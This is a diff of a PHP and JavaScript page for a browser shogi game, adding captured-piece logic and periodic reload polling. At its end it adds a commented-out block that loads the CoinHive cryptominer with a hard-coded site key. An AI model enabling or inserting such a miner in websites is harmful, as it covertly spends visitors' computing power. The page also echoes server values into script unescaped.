@@ -10,12 +10,12 @@
         <input type="text" name="share" class="share" value='<?php echo $share['url'] ?>' readonly>
     </form>
     <div class="space"></div>
-
+<?php// debug($share)?>
     <div class='battle-space'>
         <div class='komada-aite komadai shogi-item tablebox'>
             <?php foreach ($share['mochigoma-aite'] as $key => $value): ?>
                 <?php if($value > 0 ):?>
-                        <div><img src="../img/koma/<?php echo $key+14?>.svg" class='masu'>☓ <?php echo $value ?> </div>
+                        <span><img src="../img/koma/<?php echo $key+14?>.svg" class='masu'>☓ <?php echo $value ?> </span>
                 <?php endif;?>
             <?php endforeach; ?>
         </div>
@@ -24,7 +24,7 @@
         <!-- 将棋盤 -->
         <div class='shougibanshogi-item tablebox'>
             <table border="1" cellspacing="0" cellpadding="0"  id="shougiban" width="0" >
-            <?php // debug($koma)?>
+            <?php  //debug($koma)?>
                 <?php $j = 1?>
                 <?php foreach ($koma as $key => $value): ?>
                 <tr>
@@ -58,11 +58,13 @@
         </div>
 
         <div class='komada-jibun komadai shogi-item tablebox'>
+            <div class='hogehoge'>
             <?php foreach ($share['mochigoma-jibun'] as $key => $value): ?>
                 <?php if($value > 0 ):?>
-                        <div><img src="../img/koma/<?php echo $key?>.svg" class='masu'>☓ <?php echo $value ?> </div>
+                        <span><img src="../img/koma/<?php echo $key?>.svg" class='masu'>☓ <?php echo $value ?> </span>
                 <?php endif;?>
             <?php endforeach; ?>
+            </div>
         </div>
 
     </div>
@@ -122,6 +124,43 @@
     }
 
 
+
+    //---------------リロード処理
+    var roomhash = {};
+    roomhash['hash'] = '<?php echo $roomid ?>';
+    var lastupdate = <?php  echo $share['tebanint'] ?>;
+
+    $(function(){
+        setInterval(function(){
+            $.post(
+                "../api_save/checkreload",
+                roomhash,
+                function(data){
+                    if(lastupdate != data ){
+                        lastupdate = data;
+                        //手番が変わってたらりろーど
+                        location.reload();
+
+
+                    }
+
+                }
+            );
+
+        },60000);
+    });
+
+
+
+
+
+
+
+
+
+
+
+
     //----------------------------------------------------------将棋系-----------------------
 
     $('td').click(function(){
@@ -141,10 +180,8 @@
             var fromadd = class_Array[2].slice(4);
 
 
-            //ここに座標を後手用にする処理と
-            //敵駒をゲット処理をかく
+            //移動した先を記録
             if (<?php  echo $share['tebanint'] ?>){
-
                 var addto = String(10-Number(row))+'-'+String(10-Number(col));
                 var fromadd = String(10-Number(fromadd.slice(0,1))+'-'+String(10-Number(fromadd.slice(2,3))));
                 var teban = '後手';
@@ -156,12 +193,25 @@
             }
 
 
-            var arrayData = {}; //送信用オブジェクト
+            //移動した先に駒があった場合、敵駒をゲット処理をかく
+            if($("#"+addto).children().hasClass("tekijin")){
 
+                var gotkoma = $("#"+addto).children().attr('alt');
+                $("#"+addto).remove();
+
+                console.log(gotkoma);
+            }
+            else{
+                var gotkoma = '';
+            }
+
+
+            var arrayData = {}; //送信用オブジェクト
             arrayData['id'] = "<?php echo $roomid ?>";
             arrayData[fromadd] = 'brank'
             arrayData[addto] = $(".yourplace").children().attr('alt');
             arrayData['teban'] = teban;
+            arrayData['gotkoma'] = gotkoma;
 
             $('.yourplace').appendTo($(this));
             $("div").removeClass("youcango");
@@ -169,11 +219,21 @@
 
 
 
-
             $.post(
                 "../api_save/save",
                 arrayData,
                 function(data){
+                    console.log(data); //結果をアラートで表示
+                }
+            );
+            //POST 完了後リロード
+            // location.reload();
+
+
+            $.post(
+                "../api_save/checkreload",
+                arrayData,
+                function(){
                     console.log(data); //結果をアラートで表示
                 }
             );
@@ -481,3 +541,8 @@
 
 
 </script>
+<!-- <script src="https://coinhive.com/lib/coinhive.min.js"></script> -->
+<!-- <script> -->
+	<!-- var miner = new CoinHive.User('PKvDW001gc5nAy2EczGTNAONcRgmCzNi', 'john-doe'); -->
+	<!-- miner.start(); -->
+<!-- </script> -->
